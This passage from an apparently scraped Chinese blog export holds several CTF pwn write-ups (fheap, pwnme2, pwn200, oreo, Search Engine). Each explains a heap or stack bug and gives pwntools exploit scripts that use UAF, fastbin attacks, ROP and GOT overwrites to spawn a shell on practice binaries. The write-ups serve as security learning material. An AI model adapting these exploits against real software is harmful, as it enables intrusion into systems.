class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        </p>\n<p>​        这个高亮怎么这么怪，为什么多行注释当作字符串处理了啊。</p>\n<p>​        </p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["UAF"]},{"title":"hctf2016_fheap","url":"/2022/03/16/week3-2.1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-oFZFYvFU\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<p>​        第三周第二天第一道堆题。应该是一道中等偏下的fastbinattack。</p>\n<p>​        libc是2.23。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%881.17.22.png\" alt=\"截屏2022-03-16 下午1.17.22\"></p>\n<p>​        保护全开，pie是个麻烦点。</p>\n<p>​        逆向一下，这个程序的逻辑不算很复杂，但是也需要逆清楚。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%883.21.47.png\" alt=\"截屏2022-03-16 下午3.21.47\"></p>\n<p>​        程序在ptr+3的地方保存了一个有着free函数功能的指针，并且当delete str时，也是调用这个指针，而不是free函数本身，所以可以覆盖它为任意函数指针。</p>\n<p>​        为了泄露内存，我们可以尝试调用<code>printf</code>，并构造格式化字符串，找到system的地址，然后可以故技重施，将指针覆盖为system，从而getshell。</p>\n<p>​        所以利用的第一步就是覆盖这个free指针为<code>printf</code>指针，由于程序开启了pie，我们只需要，也只能覆盖指针的最后两个字节。</p>\n<p>​        对于格式化字符串，（其实我不太会》〉》〉这两天多刷一些吧，目前就copy一下大佬的exp）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">if args[&#x27;REMOTE&#x27;]:</span></span><br><span class=\"line\"><span class=\"string\">    p = remote(&quot;node4.buuoj.cn&quot;,27999)</span></span><br><span class=\"line\"><span class=\"string\">else:</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">r = process([<span class=\"string\">&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./pwn-f&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/64/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,content</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;3.quit&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;create &quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Pls give string size:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;str:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;3.quit&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;delete &quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;id:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Are you sure?:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;yes&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">&quot;aaaa&quot;</span>)<span class=\"comment\">#chunk0(0x20)</span></span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">&quot;bbbb&quot;</span>)<span class=\"comment\">#chunk1(0x20)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#main_arena =&gt; chunk1</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>)<span class=\"comment\">#main_arena=&gt; chunk0 =&gt; chunk1</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">25</span>,<span class=\"string\">b&#x27;Start%176$pEnd&#x27;</span>.ljust(<span class=\"number\">24</span>,<span class=\"string\">b&#x27;a&#x27;</span>) + <span class=\"string\">b&#x27;\\xb6&#x27;</span>)<span class=\"comment\">#chukn2 ,point to chunk0</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#print chunk</span></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Start&quot;</span>)</span><br><span class=\"line\">libc_start_main = u64(r.recvline(<span class=\"string\">&quot;END&quot;</span>,drop = <span class=\"literal\">True</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_start_main))</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = libc_start_main - libc.symbols[__libc_start_main]</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[system]</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">32</span>,<span class=\"string\">b&quot;/bin/sh;&quot;</span>.ljust(<span class=\"number\">24</span>,<span class=\"string\">b&#x27;a&#x27;</span>) + p64(system_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<p>​</p>\n","categories":["Binary_security"],"tags":["UAF"]},{"title":"ccmc_pwnme2","url":"/2022/03/16/week3-2.2/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-XUMUoaCr\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h4><span id=\"ccmc_pwnme2\">ccmc_pwnme2</span></h4><p>一道看起来人畜无害的栈题。但是有几个非常奇怪的函数。</p>\n<p>​        所以这是一道相对有些奇怪的rop，控制这三个函数的其中两个的参数为指定字符串，就能较为方便地读取flag。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">27653</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwnme2&#x27;)</span></span><br><span class=\"line\">pop_edi_ebp_ret= <span class=\"number\">0x0804867f</span></span><br><span class=\"line\">pop_ebp_ret = <span class=\"number\">0x08048680</span></span><br><span class=\"line\"></span><br><span class=\"line\">add_home = <span class=\"number\">0x08048644</span></span><br><span class=\"line\">add_flag = <span class=\"number\">0x08048682</span></span><br><span class=\"line\">exec_string  = <span class=\"number\">0x080485CB</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">112</span>  + p32(add_home) + p32(pop_ebp_ret) + p32(<span class=\"number\">0xDEADBEEF</span>) </span><br><span class=\"line\">payload += p32(add_flag) + p32(pop_edi_ebp_ret) + p32(<span class=\"number\">0xCAFEBABE</span>) + p32(<span class=\"number\">0xABADF00D</span>) </span><br><span class=\"line\">payload += p32(exec_string)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​    </p>\n<p>​    ps：感觉还需要再多做一些rop</p>\n","categories":["Binary_security"],"tags":["ret2gadgets"]},{"title":"xdctf2015_pwn200","url":"/2022/03/17/week3-3.1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-XVYAOpKc\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>     \n<h2><span id=\"xdctf2015_pwn200\">xdctf2015_pwn200</span></h2><p>​    </p>\n<p>​        练习一下DynELF。</p>\n<p>​        看起来像ret2csu+DynELF。</p>\n<p>​        没啥好分析的，溢出112,然后直接写leak函数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span>(<span class=\"params\">addr</span>):</span></span><br><span class=\"line\">\tpayload = <span class=\"string\">b&#x27;a&#x27;</span>*offset</span><br><span class=\"line\">\tpayload += p32(write_plt)</span><br><span class=\"line\">\tpayload += p32(ret_addr)</span><br><span class=\"line\">\tpayload += p32(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tpayload += p32(addr)</span><br><span class=\"line\">\tpayload += p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">\tp.send(payload)</span><br><span class=\"line\">\tdata = p.recv()</span><br><span class=\"line\">\tlog.info(<span class=\"string\">&quot;leaking: 0x%x --&gt; %s&quot;</span> % (addr, (data <span class=\"keyword\">or</span> <span class=\"string\">&#x27;&#x27;</span>).encode(<span class=\"string\">&#x27;hex&#x27;</span>)))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\">d = DynELF(leak,elf = elf)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = d.lookup(<span class=\"string\">&#x27;system&#x27;</span>,<span class=\"string\">&#x27;libc&#x27;</span>)</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        一般来说这个模块的利用就是通过stdout的函数来泄露某个地址，然后再暴力寻找，相对普通的ret2libc其实更为方便快捷，我不知道为什么感觉用的人很少。</p>\n<p>ps：关于整体布栈还是有一些小的疑问。</p>\n","categories":["Binary_security"],"tags":["DynELF"]},{"title":"2014 hack.lu oreo","url":"/2022/03/17/week3-3.2/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-tACegsSP\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>     \n<h4><span id=\"overview\">overview</span></h4><p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%883.11.04.png\" alt=\"截屏2022-03-17 下午3.11.04\"></p>\n<p>​        搞不懂为什么这么多题都要stripped。</p>\n<h4><span id=\"逆向\">逆向</span></h4><h5><span id=\"add\">add</span></h5><h5><span id><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.27.45.png\" alt=\"截屏2022-03-17 下午5.27.45\"></span></h5><p>​        申请0x38大小的chunk，user space开始处存枪支的description,+0x19处存放枪支的name。</p>\n<p>​        输入name的时候，最大长度为56，导致能够溢出，覆盖fd字段。</p>\n<p>​        同时每输入信息以后都会有一个保存指针的操作：<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.35.13.png\" alt=\"截屏2022-03-17 下午5.35.13\"></p>\n<h5><span id=\"free\">free</span></h5><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.33.13.png\" alt=\"截屏2022-03-17 下午5.33.13\"></p>\n<p>​            虽然free了ptr，但是会将allocaed chunk的fd字段作为free后的fd指针，存在ptr指向的地址。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.51.06.png\" alt=\"截屏2022-03-17 下午5.51.06\"></p>\n<p>​        可以看到bin中的fd。</p>\n<h5><span id=\"show\">show</span></h5><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%882.06.39.png\" alt=\"截屏2022-03-18 下午2.06.39\"></p>\n<p>​    </p>\n<p>​            打印descrption时会将fd指针所所指向的内容打印出来。</p>\n<h5><span id=\"messageampshow-status\">message&amp;show status</span></h5><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.22.16.png\" alt=\"截屏2022-03-18 下午3.22.16\">            </p>\n<p>​        注意<code>fgets()</code>的定义，将128字节从stdin读进notice指向的地址（bss段上），然后在show status函数中打印出来。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.23.24.png\" alt=\"截屏2022-03-18 下午3.23.24\"></p>\n<p>​        所以可以看到，在一般情况下，向message留言，一般内存布局是这样子的</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%884.01.09.png\" alt=\"截屏2022-03-18 下午4.01.09\"></p>\n<p>​        也就是a2a8指向a2c0，所以是向a2c0写入数据。这样如果把a2a8储存的数据改为某个函数的got表，就能够实现got表的更改。</p>\n<h4><span id=\"利用\">利用</span></h4><h6><span id=\"把fd项填为putsgot的地址从而泄露libc基址计算system地址\">把fd项填为<code>puts@got</code>的地址，从而泄露libc基址，计算system地址</span></h6><p>​    泄露地址利用了程序的第一个漏洞，正因为打印descrption时会将fd指针所所指向的内容打印出来，所以如果我们将其覆盖为<code>puts()</code>的got表地址，就能够泄露其地址。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">25</span> * <span class=\"string\">b&#x27;a&#x27;</span>, name)</span><br><span class=\"line\">show_rifle()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;===================================\\n&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Description: &#x27;</span>)</span><br><span class=\"line\">puts_addr = u32(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>)[:<span class=\"number\">4</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>\n<p>​        然后按套路算出<code>system()</code>的地址。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">libcbase = puts_addr - libc.symbols(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase + libc.symbols(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;system_addr &#x27;</span> + <span class=\"built_in\">hex</span>(system_addr))</span><br></pre></td></tr></table></figure>\n<h6><span id=\"利用任意地址写覆盖freegot为system_addr\">利用任意地址写覆盖free@got为system_addr</span></h6><p>​        刚才说到，我们可以将notice处的指针改为got表地址，为了做到这一点，我们需要在这个地址附近申请一个fake chunkk。</p>\n<p>​        这里主要利用到了<code>order()</code>函数中的漏洞。虽然free的过程中将ptr置0，但是chunk中还保存着fd。</p>\n<p>​        最开始有一个简单的想法，就是直接将fd覆盖为got表地址，从而在got表项地址处申请chunk来修改，想法是自然的，然而如果只是单纯地将fd覆盖为free@got，并不能成功地在target addr分配chunk，这是由于分配chunk时的一系列检测。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.11.png\" alt=\"截屏2022-03-18 下午3.45.11\"></p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.41.png\" alt=\"截屏2022-03-18 下午3.45.41\"></p>\n<p>​        如果直接将fd填成<code>free_got_addr</code>，就会造成double free。为什么捏？如果是地址无效我还是能够理解，但是double free我确实不理解。在free了当前chunk之后，fastbin不是应该长这样 》<code>main_arena =&gt; free_got_addr =&gt;chunk0</code>?怎么会有double free呢？</p>\n<p>​        </p>\n<p>​        先不管。</p>\n<p>​        回到在notice附近构造fake chunk，可以先add一个chunk，并按照之前的方式覆盖fd为notice的地址。这样一来当我们free这个chunk，再add 相同size的chunk时，notice就会被作为fake chunk的ptr，被分配出去。</p>\n<p>​        当然，为了成功伪造fake chunk，我们至少要将notice的空间添加一些chunk该有的结构，比如说size。以及next chunk的size和prev size。</p>\n<p>​        为了覆盖got表，user space开始的地址需要是<code>0x804A2A</code>,所以这个chunk的size的地址在<code>0x804A2A4</code></p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%885.24.13.png\" alt=\"截屏2022-03-18 下午5.24.13\"></p>\n<p>​        可以看到这个地址正好是枪支已经添加的数量，所以为了构造fake chunk的size，我们可以先总共申0x40个枪支，因为之前泄露libc已经申请了一个，所以只需要再申请0x40-1只。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">if args[&#x27;REMOTE&#x27;]:</span></span><br><span class=\"line\"><span class=\"string\">    p = remote(&quot;node4.buuoj.cn&quot;,27999)</span></span><br><span class=\"line\"><span class=\"string\">else:</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./oreo&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/32/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./oreo&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">strlen_got_addr = elf.got[<span class=\"string\">&#x27;strlen&#x27;</span>]</span><br><span class=\"line\">notice_addr = <span class=\"number\">0x804A2A8</span></span><br><span class=\"line\">free_got_addr = <span class=\"number\">0x804A238</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">descrip, name</span>):</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\">#p.recvuntil(&#x27;Rifle name: &#x27;)</span></span><br><span class=\"line\">    p.sendline(name)</span><br><span class=\"line\">    <span class=\"comment\">#p.recvuntil(&#x27;Rifle description: &#x27;)</span></span><br><span class=\"line\">    <span class=\"comment\">#sleep(0.5)</span></span><br><span class=\"line\">    p.sendline(descrip)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show_rifle</span>():</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;===================================\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">order</span>():</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">message</span>(<span class=\"params\">notice</span>):</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\">#p.recvuntil(&quot;Enter any notice you&#x27;d like to submit with your order: &quot;)</span></span><br><span class=\"line\">    p.sendline(notice)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#find libc base</span></span><br><span class=\"line\"></span><br><span class=\"line\">name = <span class=\"number\">27</span> * <span class=\"string\">b&#x27;a&#x27;</span> + p32(elf.got[<span class=\"string\">&#x27;puts&#x27;</span>])</span><br><span class=\"line\">add(<span class=\"number\">25</span> * <span class=\"string\">b&#x27;a&#x27;</span>, name)</span><br><span class=\"line\">show_rifle()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;===================================\\n&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Description: &#x27;</span>)</span><br><span class=\"line\">puts_addr = u32(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;puts_addr &#x27;</span> + <span class=\"built_in\">hex</span>(puts_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = puts_addr - libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">system_addr = libcbase + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;system_addr &#x27;</span> + <span class=\"built_in\">hex</span>(system_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#overwrite free@got</span></span><br><span class=\"line\">n = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> n &lt; <span class=\"number\">0x3f</span>:</span><br><span class=\"line\"><span class=\"comment\"># set next link=NULL</span></span><br><span class=\"line\">    add(<span class=\"number\">25</span> * <span class=\"string\">b&#x27;a&#x27;</span>, <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">27</span> + p32(<span class=\"number\">0</span>))</span><br><span class=\"line\">    n += <span class=\"number\">1</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">25</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">27</span>+p32(notice_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x20</span>  +p32(<span class=\"number\">0x40</span>) + p32(<span class=\"number\">0x99</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">52</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">128</span>,<span class=\"string\">b&#x27;c&#x27;</span>)</span><br><span class=\"line\">message(payload)</span><br><span class=\"line\">order()</span><br><span class=\"line\"><span class=\"comment\">#p.recvuntil(&#x27;Okay order submitted!\\n&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#modify the strlen_got to system</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(strlen_got_addr).ljust(<span class=\"number\">20</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(payload,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">20</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\"></span><br><span class=\"line\">message(p32(system_addr) + <span class=\"string\">b&#x27;;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​</p>\n","categories":["Binary_security"],"tags":["UAF"]},{"title":"9447_CTF-Search Engine","url":"/2022/03/29/week5-2.1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-OIlqxYkd\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h2><span id=\"overview\">overview</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-29%20%E4%B8%8A%E5%8D%8810.43.22.png\" alt=\"截屏2022-03-29 上午10.43.22\"></p>\n<h2><span id=\"逆向\">逆向</span></h2><h3><span id=\"menu\">menu</span></h3><p>​            一共只有两个功能，search word和index sentence。</p>\n<h3><span id=\"index-sentence\">index sentence</span></h3><p>​        指针操作有点多，配合gdb观看效果更佳。</p>\n<p>​        当只malloc一个10 size的chunk时，内存是这样的，代码是这样的：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-29%20%E4%B8%8A%E5%8D%8811.04.56.png\" alt=\"截屏2022-03-29 上午11.04.56\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Enter the sentence size:&quot;</span>);</span><br><span class=\"line\">  v0 = read_num();</span><br><span class=\"line\">  sentence_size = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)(v0 - <span class=\"number\">1</span>);</span><br><span class=\"line\">  size = v0;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)sentence_size &gt; <span class=\"number\">0xFFFD</span> )</span><br><span class=\"line\">    error(<span class=\"string\">&quot;Invalid size&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Enter the sentence:&quot;</span>);</span><br><span class=\"line\">  sentence_ptr = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(size);<span class=\"comment\">//一个content chunk</span></span><br><span class=\"line\">  read_word((__int64)sentence_ptr, size, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v4 = sentence_ptr + <span class=\"number\">1</span>;</span><br><span class=\"line\">  v5 = (__int64)&amp;sentence_ptr[sentence_size + <span class=\"number\">2</span>];</span><br><span class=\"line\">  